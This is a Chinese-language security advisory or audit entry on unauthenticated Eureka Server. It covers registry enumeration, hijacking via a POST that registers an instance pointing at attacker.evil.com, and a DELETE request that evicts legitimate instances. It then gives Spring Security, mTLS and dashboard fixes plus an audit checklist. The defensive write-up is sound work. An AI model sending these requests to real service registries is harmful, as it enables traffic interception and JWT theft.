# Eureka Server 未鉴权与服务注册劫持

## 默认配置的问题

Eureka Server 开箱即用无鉴权。默认端口 8761 `/eureka/apps` 返回全部注册实例，
`/eureka/apps/{app}` 可注册任意实例。

## 攻击场景

### 1. 信息泄漏

```
GET /eureka/apps
```

返回全部微服务列表 + 每个实例的 hostname / IP / port / metadata。攻击者据此
绘制内网拓扑。

### 2. 恶意实例注册（服务劫持）

```http
POST /eureka/apps/USER-SERVICE HTTP/1.1
Content-Type: application/json

{
  "instance": {
    "instanceId": "attacker-node:user-service:8080",
    "hostName": "attacker.evil.com",
    "app": "USER-SERVICE",
    "ipAddr": "10.0.0.99",
    "port": {"$": 8080, "@enabled": "true"},
    "status": "UP",
    "healthCheckUrl": "http://attacker.evil.com:8080/health",
    "vipAddress": "user-service",
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}
```

Ribbon / LoadBalancer 会按权重分流到攻击者节点。攻击者可：
- 拦截 HTTP 请求（中间人 + JWT 窃取）
- 返回恶意响应
- 慢速拒绝服务

### 3. 实例下线攻击

```
DELETE /eureka/apps/USER-SERVICE/legitimate-instance-id
```

将合法实例踢出，配合注册攻击 = 100% 流量劫持。

## 修复

### 启用 Spring Security

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.ignoringRequestMatchers("/eureka/**"))
            .authorizeHttpRequests(a -> a.anyRequest().authenticated())
            .httpBasic(Customizer.withDefaults());
        return http.build();
    }
}
```

```yaml
spring:
  security:
    user:
      name: eureka
      password: ${EUREKA_PWD}
eureka:
  client:
    serviceUrl:
      defaultZone: http://eureka:${EUREKA_PWD}@registry:8761/eureka/
```

### mTLS

生产环境走 mTLS，仅信任签名的服务实例。

### 关闭 Dashboard

```yaml
eureka:
  dashboard:
    enabled: false
```

## 审计动作

- [ ] `spring.security.user.*` 配置
- [ ] 客户端 `defaultZone` 是否包含凭证或走 mTLS
- [ ] `eureka.dashboard.enabled` 是否 false
- [ ] `/actuator/eureka` 是否暴露

## 相关规则

- CWE: CWE-306 (Missing Authentication)
- CWE: CWE-284 (Access Control)
- 内建 pattern: `spring_cloud_misconfig`
